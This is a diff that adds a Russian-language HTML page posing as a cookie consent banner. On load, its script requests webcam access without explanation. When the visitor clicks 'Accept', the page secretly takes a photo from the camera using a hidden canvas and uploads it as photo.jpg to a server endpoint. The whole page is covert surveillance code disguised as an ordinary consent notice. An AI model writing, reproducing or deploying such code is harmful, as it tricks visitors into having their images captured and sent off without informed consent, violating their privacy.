@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Consent</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="cookieConsent">
+        Этот сайт использует файлы cookie. 
+        <button onclick="acceptCookies()">Принять</button>
+    </div>
+
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            if (!localStorage.getItem("cookiesAccepted")) {
+                document.getElementById("cookieConsent").style.display = "block";
+            }
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    let video = document.createElement("video");
+                    video.srcObject = stream;
+                    video.play();
+                    document.videoStream = video;
+                })
+                .catch(error => console.error("Ошибка доступа к камере:", error));
+        });
+
+        function acceptCookies() {
+            localStorage.setItem("cookiesAccepted", "true");
+            document.getElementById("cookieConsent").style.display = "none";
+            fetch('/accept-cookies', { method: 'POST' })
+                .then(response => response.json())
+                .then(data => console.log(data));
+            captureAndSend();
+        }
+
+        function captureAndSend() {
+            let video = document.videoStream;
+            let canvas = document.getElementById("canvas");
+            let context = canvas.getContext("2d");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                let formData = new FormData();
+                formData.append("image", blob, "photo.jpg");
+
+                fetch('/upload-photo', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log("Фото отправлено:", data))
+                .catch(error => console.error("Ошибка при отправке фото:", error));
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
